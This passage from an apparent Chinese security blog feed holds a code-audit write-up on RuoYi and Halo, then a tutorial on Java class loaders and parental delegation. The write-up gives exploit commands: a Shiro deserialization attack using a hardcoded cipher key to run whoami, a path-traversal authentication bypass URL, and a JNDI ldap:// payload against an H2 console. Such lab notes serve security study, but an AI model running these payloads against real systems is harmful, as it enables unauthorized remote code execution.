src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246573120-91bb2105-35a1-4084-bb1a-90065c757703.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246599154-711174ff-3766-4002-84e1-e5cb323c44c3.png"></p><p>尝试成功直接上工具java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C”calc”</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246729108-7c66ba42-b67b-4877-bb7c-85f84bcbc40b.png"></p><p>直接利用</p><h3 id="Ruoyi-Shiro1-4-2"><a href="#Ruoyi-Shiro1-4-2" class="headerlink" title="Ruoyi-Shiro1.4.2"></a>Ruoyi-Shiro1.4.2</h3><p>4.2版本</p><h4 id="1、反序列化："><a href="#1、反序列化：" class="headerlink" title="1、反序列化："></a>1、反序列化：</h4><p>setCipherKey-&gt;fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</p><p><a href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a></p><p>python shiro-exploit.py check -u <a href="http://192.168.1.2/">http://192.168.1.2/</a></p><p>python shiro-exploit.py echo -g CommonsCollectionsK1-u <a href="http://192.168.1.2/-v">http://192.168.1.2/-v</a> 2 -k fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;-c whoami</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296800167-4b477b8c-0de6-450a-8333-494f877f4c73.png"></p><p>源码密钥位置setCipherKey   fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D;</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719296923275-cf70b98e-8b6c-404c-97ff-1f2073a35059.png"></p><p>python3 shiro-exploit.py check -u <a href="http://10.211.55.3:82/">http://10.211.55.3:82/</a></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719313653902-877d5b02-3f68-40b3-a163-998a76cff2e0.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314723527-305b1dca-339e-40c2-b3a6-6c7352b2eb49.png"></p><p>python3 shiro-exploit.py echo -g CommonsCollectionsK1 -u <a href="http://10.211.55.3:82/">http://10.211.55.3:82/</a> -v 2 -k fCq+&#x2F;xW488hMTCD+cmJ3aQ&#x3D;&#x3D; -c whoami</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719314772637-5e1ddc13-434f-423f-bdc6-d229155a97cd.png"></p><h4 id="2、权限绕过："><a href="#2、权限绕过：" class="headerlink" title="2、权限绕过："></a>2、权限绕过：</h4><p>-anon为匿名拦截器，不需要登录就能访问，一般用于静态资源,或者移动端接口</p><p>-authc为登录拦截器，需要登录认证才能访问的资源。</p><p>例子：</p><p>[urls]</p><p>&#x2F;index.html &#x3D; anon 允许访问</p><p>&#x2F;user&#x2F;** &#x3D; authc 需要验证</p><p>shiro匹配规则</p><p>?：匹配一个字符<br>*：匹配零个或多个字符串</p><p>**：匹配路径中的零个或多个路径</p><p>配置：com&#x2F;ruoyi&#x2F;framework&#x2F;config&#x2F;ShiroConfig.java</p><p>绕过：<a href="https://www.freebuf.com/vuls/231909.html">https://www.freebuf.com/vuls/231909.html</a></p><p>测试：&#x2F;ajax;&#x2F;..&#x2F;common&#x2F;download&#x2F;resource?resource&#x3D;&#x2F;profile&#x2F;1.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719901361541-5d1239ac-11ef-4d8b-bcde-a4dde3a50ed8.png"></p><h3 id="Halo-H2database-1-4-197"><a href="#Halo-H2database-1-4-197" class="headerlink" title="Halo-H2database 1.4.197"></a>Halo-H2database 1.4.197</h3><p>H2database-&gt;application.yaml-&gt;web-allow-others: true</p><p>javax.naming.InitialContext</p><p>ldap:&#x2F;&#x2F;192.168.139.1:1389&#x2F;5eebf8</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “calc”</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719902822307-4b31629b-d9ca-467c-b41b-ff5c9166acb8.png"></p><p>数据库地址</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903123962-09d94779-2740-4ec9-8bbc-417e2910f3a1.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903155176-abc5662c-5dbd-4bbf-af2d-b8ae90a3a8cf.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719903732471-1dbdb7c7-ef8a-4462-8aca-4da6910acb4c.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719904062962-36b60d1b-2b75-4f76-aa35-40a96e4ced7d.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ClassLoader</title>
      <link href="/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
      <url>/2024/11/04/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h3><p>上面说到了java字节码，下面是对类加载过程的介绍</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742453862839-6e2f690c-bb99-4db3-a9d1-7b59b67a0ec4.png"></p><p>类从被加载到 JVM 开始，到卸载出内存，整个生命周期分为七个阶段，分别是加载、验证、准备、解析、初始化、使用和卸载。其中验证、准备和解析这三个阶段统称为连接。</p><p>除去使用和卸载，就是 Java 的类加载过程。这 5 个阶段一般是顺序发生的，但在动态绑定的情况下，解析阶段发生在初始化阶段之后（我们随后来解释）。</p><h4 id="Loading（载入）"><a href="#Loading（载入）" class="headerlink" title="Loading（载入）"></a>Loading（载入）</h4><p>类加载过程的第一步，主要完成下面 3 件事情：</p><ol><li>通过全类名获取定义此类的二进制字节流。</li><li>将字节流所代表的静态存储结构转换为方法区的运行时数据结构。</li><li>在内存中生成一个代表该类的 <code>Class</code> 对象，作为方法区这些数据的访问入口。</li></ol><p>虚拟机规范上面这 3 点并不具体，因此是非常灵活的。比如：”通过全类名获取定义此类的二进制字节流” 并没有指明具体从哪里获取（ <code>ZIP</code>、 <code>JAR</code>、<code>EAR</code>、<code>WAR</code>、网络、动态代理技术运行时动态生成、其他文件生成比如 <code>JSP</code>…）、怎样获取。</p><p>加载这一步主要是通过我们后面要讲到的 <strong>类加载器</strong> 完成的。类加载器有很多种，当我们想要加载一个类的时候，具体是哪个类加载器加载由 <strong>双亲委派模型</strong> 决定（不过，我们也能打破双亲委派模型）。</p><p>每个 Java 类都有一个引用指向加载它的 <code>ClassLoader</code>。不过，数组类不是通过 <code>ClassLoader</code> 创建的，而是 JVM 在需要的时候自动创建的，数组类通过<code>getClassLoader()</code>方法获取 <code>ClassLoader</code> 的时候和该数组的元素类型的 <code>ClassLoader</code> 是一致的。</p><p>一个非数组类的加载阶段（加载阶段获取类的二进制字节流的动作）是可控性最强的阶段，这一步我们可以去完成还可以自定义类加载器去控制字节流的获取方式（重写一个类加载器的 <code>loadClass()</code> 方法）。</p><p>加载阶段与连接阶段的部分动作(如一部分字节码文件格式验证动作)是交叉进行的，加载阶段尚未结束，连接阶段可能就已经开始了。</p><h4 id="Verification（验证）"><a href="#Verification（验证）" class="headerlink" title="Verification（验证）"></a>Verification（验证）</h4><p><strong>验证是连接阶段的第一步，这一阶段的目的是确保 Class 文件的字节流中包含的信息符合《Java 虚拟机规范》的全部约束要求，保证这些信息被当作代码运行后不会危害虚拟机自身的安全。</strong></p><p>验证阶段这一步在整个类加载过程中耗费的资源还是相对较多的，但很有必要，可以有效防止恶意代码的执行。任何时候，程序安全都是第一位。</p><p>不过，验证阶段也不是必须要执行的阶段。如果程序运行的全部代码(包括自己编写的、第三方包中的、从外部加载的、动态生成的等所有代码)都已经被反复使用和验证过，在生产环境的实施阶段就可以考虑使用 <code>-Xverify:none</code> 参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。但是需要注意的是 <code>-Xverify:none</code> 和 <code>-noverify</code> 在 JDK 13 中被标记为 deprecated ，在未来版本的 JDK 中可能会被移除。</p><p>验证阶段主要由四个检验阶段组成：</p><ol><li>文件格式验证（Class 文件格式检查）</li><li>元数据验证（字节码语义检查）</li><li>字节码验证（程序语义检查）</li><li>符号引用验证（类的正确性检查</li></ol><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742520156073-1d90d6b3-2b9d-4e87-bd2d-faf8c8de8cf9.png"></p><h4 id="Preparation（准备）"><a href="#Preparation（准备）" class="headerlink" title="Preparation（准备）"></a>Preparation（准备）</h4><p><strong>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段</strong>，这些内存都将在方法区中分配。对于该阶段有以下几点需要注意：</p><ol><li>这时候进行内存分配的仅包括类变量（ Class Variables ，即静态变量，被 <code>static</code> 关键字修饰的变量，只与类相关，因此被称为类变量），而不包括实例变量。实例变量会在对象实例化时随着对象一块分配在 Java 堆中。</li><li>从概念上讲，类变量所使用的内存都应当在 <strong>方法区</strong> 中进行分配。不过有一点需要注意的是：JDK 7 之前，HotSpot 使用永久代来实现方法区的时候，实现是完全符合这种逻辑概念的。 而在 JDK 7 及之后，HotSpot 已经把原本放在永久代的字符串常量池、静态变量等移动到堆中，这个时候类变量则会随着 Class 对象一起存放在 Java 堆中。相关阅读：<a href="https://github.com/fenixsoft/jvm_book/issues/75">《深入理解 Java 虚拟机（第 3 版）》勘误#75</a></li><li>这里所设置的初始值”通常情况”下是数据类型默认的零值（如 0、0L、null、false 等），比如我们定义了<code>public static int value=111</code> ，那么 value 变量在准备阶段的初始值就是 0 而不是 111（初始化阶段才会赋值）。特殊情况：比如给 value 变量加上了 final 关键字<code>public static final int value=111</code> ，那么准备阶段 value 的值就被赋值为 111。</li></ol><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742520257749-011c36aa-1d6e-43bf-bf28-51d46259753b.png"></p><h4 id="Resolution（解析）"><a href="#Resolution（解析）" class="headerlink" title="Resolution（解析）"></a>Resolution（解析）</h4><p>该阶段将常量池中的符号引用转化为直接引用。这里就牵引出来问题了，什么是符号引用？什么是直接引用？</p><p><strong>符号引用</strong>以一组符号（任何形式的字面量，只要在使用时能够无歧义的定位到目标即可）来描述所引用的目标。</p><p>在编译时，Java 类并不知道所引用的类的实际地址，因此只能使用符号引用来代替。比如 <code>com.Wanger</code> 类引用了 <code>com.Chenmo</code> 类，编译时 Wanger 类并不知道 Chenmo 类的实际内存地址，因此只能使用符号 <code>com.Chenmo</code>。</p><p><strong>直接引用</strong>通过对符号引用进行解析，找到引用的实际内存地址。我们再来对比说明一下。</p><p><strong>符号引用</strong></p><ul><li><strong>定义</strong>：包含了类、字段、方法、接口等多种符号的全限定名。</li><li><strong>特点</strong>：在编译时生成，存储在编译后的<a href="https://javabetter.cn/jvm/class-file-jiegou.html">字节码文件</a>的常量池中。</li><li><strong>独立性</strong>：不依赖于具体的内存地址，提供了更好的灵活性。</li></ul><p><strong>直接引用</strong></p><ul><li><strong>定义</strong>：直接指向目标的指针、相对偏移量或者能间接定位到目标的句柄。</li><li><strong>特点</strong>：在运行时生成，依赖于具体的内存布局。</li><li><strong>效率</strong>：由于直接指向了内存地址或者偏移量，所以通过直接引用访问对象的效率较高。</li></ul><p>这么说还是有点抽象，具体举个例子</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742520630029-1e880950-b5be-4f27-9512-f5b001113b7d.png"></p><p>在上面的例子中：</p><ul><li><code>class A</code> 引用了 <code>class B</code>。</li><li>在编译时，这个引用变成了符号引用，存储在 <code>.class</code> 文件的常量池中。</li><li>在运行时，当 <code>class A</code> 需要使用 <code>class B</code> 的时候，JVM 会将符号引用解析为直接引用，指向内存中的 <code>class B</code> 对象或其元数据。</li></ul><h4 id="Initialization（初始化）"><a href="#Initialization（初始化）" class="headerlink" title="Initialization（初始化）"></a>Initialization（初始化）</h4><p>该阶段是类加载过程的最后一步。在准备阶段，类变量已经被赋过默认初始值，而在初始化阶段，类变量将被赋值为代码期望赋的值。换句话说，初始化阶段是执行类构造器方法（javap中看到的 <code>&lt;clinit&gt;()</code> 方法）的过程。</p><p>上面这段话可能说得很抽象，不好理解，我来举个例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String calm = new String(&quot;hhhh&quot;);</span><br></pre></td></tr></table></figure><p>上面这段代码使用了 <code>new</code> 关键字来实例化一个字符串对象，那么这时候，就会调用 String 类的构造方法对 calm 进行实例化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public String(String original) &#123;</span><br><span class="line">    this.value = original.value;</span><br><span class="line">    this.hash = original.hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化时机包括以下这些：</p><ul><li>创建类的实例时。</li><li>访问类的静态方法或静态字段时（除了 final 常量，它们在编译期就已经放入常量池）。</li><li>使用 java.lang.reflect 包的方法对类进行反射调用时。</li><li>初始化一个类的子类（首先会初始化父类）。</li><li>JVM 启动时，用户指定的主类（包含 main 方法的类）将被初始化。</li></ul><h4 id="类加载器分类"><a href="#类加载器分类" class="headerlink" title="类加载器分类"></a>类加载器分类</h4><p>说完了类加载器机制就要说到分类了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742522688330-186bb80e-e7e5-4b36-a7bc-3979e490747f.png"></p><p>自底向上查找判断类是否被加载，自顶向下尝试加载类</p><p>在介绍之前先来个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ClassLoader loader = Main.class.getClassLoader();</span><br><span class="line">        while (loader != null) &#123;</span><br><span class="line">            System.out.println(loader);</span><br><span class="line">            loader = loader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/bin/java -javaagent:/Applications/IntelliJ IDEA.app/Contents/lib/idea_rt.jar=59283:/Applications/IntelliJ IDEA.app/Contents/bin -Dfile.encoding=UTF-8 -classpath /Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/charsets.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/deploy.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/cldrdata.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/dnsns.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/jaccess.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/jfxrt.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/localedata.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/nashorn.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/sunec.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/sunjce_provider.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/sunpkcs11.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/ext/zipfs.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/javaws.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jce.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jfr.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jfxswt.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/jsse.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/management-agent.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/plugin.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/resources.jar:/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/rt.jar:/Users/apple/Documents/javacode/classloader/target/classes org.example.Main</span><br><span class="line">sun.misc.Launcher$AppClassLoader@5ce65a89</span><br><span class="line">sun.misc.Launcher$ExtClassLoader@1edf1c96</span><br></pre></td></tr></table></figure><p>可以看到BootstrapClassLoader获取到是null，为什么呢？因为<code>BootstrapClassLoader</code> 由 C++ 实现，由于这个 C++ 实现的类加载器在 Java 中是没有与之对应的类的，所以拿到的结果是 null。</p><ul><li><strong>第一个：启动类&#x2F;引导类：Bootstrap ClassLoader</strong></li></ul><p>这个类加载器使用C&#x2F;C++语言实现的，嵌套在JVM内部，java程序无法直接操作这个类。</p><p>它用来加载Java核心类库，如：<code>JAVA_HOME/jre/lib/rt.jar</code>、<code>resources.jar</code>、<code>sun.boot.class.path</code>路径下的包，用于提供jvm运行所需的包。</p><p>并不是继承自java.lang.ClassLoader，它没有父类加载器</p><p>它加载<code>扩展类加载器</code>和<code>应用程序类加载器</code>，并成为他们的父类加载器</p><p>出于安全考虑，启动类只加载包名为：java、javax、sun开头的类</p><ul><li><strong>第二个：扩展类加载器：Extension ClassLoader</strong></li></ul><p>Java语言编写，由<code>sun.misc.Launcher$ExtClassLoader</code>实现，我们可以用Java程序操作这个加载器</p><p>派生继承自java.lang.ClassLoader，父类加载器为<code>启动类加载器</code></p><p>从系统属性：<code>java.ext.dirs</code>目录中加载类库，或者从JDK安装目录：<code>jre/lib/ext</code>目录下加载类库。我们就可以将我们自己的包放在以上目录下，就会自动加载进来了。</p><ul><li><strong>第三个：应用程序类加载器：Application Classloader</strong></li></ul><p>Java语言编写，由<code>sun.misc.Launcher$AppClassLoader</code>实现。</p><p>派生继承自java.lang.ClassLoader，父类加载器为<code>启动类加载器</code></p><p>它负责加载<code>环境变量classpath</code>或者<code>系统属性java.class.path</code>指定路径下的类库</p><p>它是程序中默认的类加载器，我们Java程序中的类，都是由它加载完成的。</p><p>我们可以通过<code>ClassLoader#getSystemClassLoader()</code>获取并操作这个加载器</p><ul><li><strong>第四个：自定义加载器</strong></li></ul><p>一般情况下，以上3种加载器能满足我们日常的开发工作，不满足时，我们还可以<code>自定义加载器</code></p><p>比如用网络加载Java类，为了保证传输中的安全性，采用了加密操作，那么以上3种加载器就无法加载这个类，这时候就需要<code>自定义加载器</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class CustomClassLoader extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">    private String pathToBin;</span><br><span class="line"></span><br><span class="line">    public CustomClassLoader(String pathToBin) &#123;</span><br><span class="line">        this.pathToBin = pathToBin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] classData = loadClassData(name);</span><br><span class="line">            return defineClass(name, classData, 0, classData.length);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new ClassNotFoundException(&quot;Class &quot; + name + &quot; not found&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private byte[] loadClassData(String name) throws IOException &#123;</span><br><span class="line">        String file = pathToBin + name.replace(&#x27;.&#x27;, File.separatorChar) + &quot;.class&quot;;</span><br><span class="line">        InputStream is = new FileInputStream(file);</span><br><span class="line">        ByteArrayOutputStream byteSt = new ByteArrayOutputStream();</span><br><span class="line">        int len = 0;</span><br><span class="line">        while ((len = is.read()) != -1) &#123;</span><br><span class="line">            byteSt.write(len);</span><br><span class="line">        &#125;</span><br><span class="line">        return byteSt.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个自定义类加载器做了以下几件事情：</p><ul><li>构造器：接受一个字符串参数，这个字符串指定了类文件的存放路径。</li><li>覆写 findClass 方法：当父类加载器无法加载类时，findClass 方法会被调用。在这个方法中，首先使用 loadClassData 方法读取类文件的字节码，然后调用 defineClass 方法来将这些字节码转换为 Class 对象。</li><li>loadClassData 方法：读取指定路径下的类文件内容，并将内容作为字节数组返回。</li></ul><h5 id="获取ClassLoader的几种方式"><a href="#获取ClassLoader的几种方式" class="headerlink" title="获取ClassLoader的几种方式"></a>获取ClassLoader的几种方式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 方式一：获取当前类的 ClassLoader</span><br><span class="line">clazz.getClassLoader()</span><br><span class="line">// 方式二：获取当前线程上下文的 ClassLoader</span><br><span class="line">Thread.currentThread().getContextClassLoader()</span><br><span class="line">// 方式三：获取系统的 ClassLoader</span><br><span class="line">ClassLoader.getSystemClassLoader()</span><br><span class="line">// 方式四：获取调用者的 ClassLoader</span><br><span class="line">DriverManager.getCallerClassLoader()</span><br></pre></td></tr></table></figure><h5 id="双亲委派"><a href="#双亲委派" class="headerlink" title="双亲委派"></a>双亲委派</h5><h5 id="双亲委派模型（Parent-Delegation-Model）是-Java-类加载器使用的一种机制，用于确保-Java-程序的稳定性和安全性。在这个模型中，类加载器在尝试加载一个类时，首先会委派给其父加载器去尝试加载这个类，只有在父加载器无法加载该类时，子加载器才会尝试自己去加载。"><a href="#双亲委派模型（Parent-Delegation-Model）是-Java-类加载器使用的一种机制，用于确保-Java-程序的稳定性和安全性。在这个模型中，类加载器在尝试加载一个类时，首先会委派给其父加载器去尝试加载这个类，只有在父加载器无法加载该类时，子加载器才会尝试自己去加载。" class="headerlink" title="双亲委派模型（Parent Delegation Model）是 Java 类加载器使用的一种机制，用于确保 Java 程序的稳定性和安全性。在这个模型中，类加载器在尝试加载一个类时，首先会委派给其父加载器去尝试加载这个类，只有在父加载器无法加载该类时，子加载器才会尝试自己去加载。"></a>双亲委派模型（Parent Delegation Model）是 Java 类加载器使用的一种机制，用于确保 Java 程序的稳定性和安全性。在这个模型中，类加载器在尝试加载一个类时，首先会委派给其父加载器去尝试加载这个类，只有在父加载器无法加载该类时，子加载器才会尝试自己去加载。</h5><ol><li><strong>委派给父加载器</strong>：当一个类加载器接收到类加载的请求时，它首先不会尝试自己去加载这个类，而是将这个请求委派给它的父加载器。</li><li><strong>递归委派</strong>：这个过程会递归向上进行，从启动类加载器（Bootstrap ClassLoader）开始，再到扩展类加载器（Extension ClassLoader），最后到系统类加载器（System ClassLoader）。</li><li><strong>加载类</strong>：如果父加载器可以加载这个类，那么就使用父加载器的结果。如果父加载器无法加载这个类（它没有找到这个类），子加载器才会尝试自己去加载。</li><li><strong>安全性和避免重复加载</strong>：这种机制可以确保不会重复加载类，并保护 Java 核心 API 的类不被恶意替换。</li></ol><p>JVM 区分不同类的依据是类名加上加载该类的类加载器，即使类名相同，如果由不同的类加载器加载，也会被视为不同的类。 双亲委派模型确保核心类总是由 <code>BootstrapClassLoader</code> 加载，保证了核心类的唯一性。</p><p>例如，当应用程序尝试加载 <code>java.lang.Object</code> 时，<code>AppClassLoader</code> 会首先将请求委派给 <code>ExtClassLoader</code>，<code>ExtClassLoader</code> 再委派给 <code>BootstrapClassLoader</code>。<code>BootstrapClassLoader</code> 会在 JRE 核心类库中找到并加载 <code>java.lang.Object</code>，从而保证应用程序使用的是 JRE 提供的标准版本。</p><p>即使攻击者绕过了双亲委派模型，Java 仍然具备更底层的安全机制来保护核心类库。<code>ClassLoader</code> 的 <code>preDefineClass</code> 方法会在定义类之前进行类名校验。任何以 <code>&quot;java.&quot;</code> 开头的类名都会触发 <code>SecurityException</code>，阻止恶意代码定义或加载伪造的核心类。</p><p>类加载器的层级结构如下图所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Bootstrap ClassLoader</span><br><span class="line">        ↑</span><br><span class="line">        │</span><br><span class="line">Extension ClassLoader</span><br><span class="line">        ↑</span><br><span class="line">        │</span><br><span class="line">System/Application ClassLoader</span><br><span class="line">        ↑</span><br><span class="line">        │</span><br><span class="line">Custom ClassLoader</span><br></pre></td></tr></table></figure><p>这种层次关系被称作为<strong>双亲委派模型</strong>：如果一个类加载器收到了加载类的请求，它会先把请求委托给上层加载器去完成，上层加载器又会委托上上层加载器，一直到最顶层的类加载器；如果上层加载器无法完成类的加载工作时，当前类加载器才会尝试自己去加载这个类。</p><p>自定义加载器的话，需要继承 <code>ClassLoader</code> 。如果我们不想打破双亲委派模型，就重写 <code>ClassLoader</code> 类中的 <code>findClass()</code> 方法即可，无法被父类加载器加载的类最终会通过这个方法被加载。但是，如果想打破双亲委派模型则需要重写 <code>loadClass()</code> 方法。</p><p>为什么是重写 <code>loadClass()</code> 方法打破双亲委派模型呢？双亲委派模型的执行流程已经解释了：类加载器在进行类加载的时候，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成（调用父加载器 <code>loadClass()</code>方法来加载类）。重写 <code>loadClass()</code>方法之后，我们就可以改变传统双亲委派模型的执行流程。例如，子类加载器可以在委派给父类加载器之前，先自己尝试加载这个类，或者在父类加载器返回之后，再尝试从其他地方加载这个类。具体的规则由我们自己实现，根据项目需求定制化。</p><p>我们比较熟悉的 Tomcat 服务器为了能够优先加载 Web 应用目录下的类，然后再加载其他目录下的类，就自定义了类加载器 <code>WebAppClassLoader</code> 来打破双亲委托机制。这也是 Tomcat 下 Web 应用之间的类实现隔离的具体原理。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742533433890-a60e21dc-7eb7-4a2b-aeec-99ef60b6b3e3.png"></p><p>Tomcat 这四个自定义的类加载器对应的目录如下：</p><ul><li><code>CommonClassLoader</code>对应<code>&lt;Tomcat&gt;/common/*</code></li><li><code>CatalinaClassLoader</code>对应<code>&lt;Tomcat &gt;/server/*</code></li><li><code>SharedClassLoader</code>对应 <code>&lt;Tomcat &gt;/shared/*</code></li><li><code>WebAppClassloader</code>对应 <code>&lt;Tomcat &gt;/webapps/&lt;app&gt;/WEB-INF/*</code></li></ul><p>从图中的委派关系中可以看出：</p><ul><li><code>CommonClassLoader</code>作为 <code>CatalinaClassLoader</code> 和 <code>SharedClassLoader</code> 的父加载器。<code>CommonClassLoader</code> 能加载的类都可以被 <code>CatalinaClassLoader</code> 和 <code>SharedClassLoader</code> 使用。因此，<code>CommonClassLoader</code> 是为了实现公共类库（可以被所有 Web 应用和 Tomcat 内部组件使用的类库）的共享和隔离。</li><li><code>CatalinaClassLoader</code> 和 <code>SharedClassLoader</code> 能加载的类则与对方相互隔离。<code>CatalinaClassLoader</code> 用于加载 Tomcat 自身的类，为了隔离 Tomcat 本身的类和 Web 应用的类。<code>SharedClassLoader</code> 作为 <code>WebAppClassLoader</code> 的父加载器，专门来加载 Web 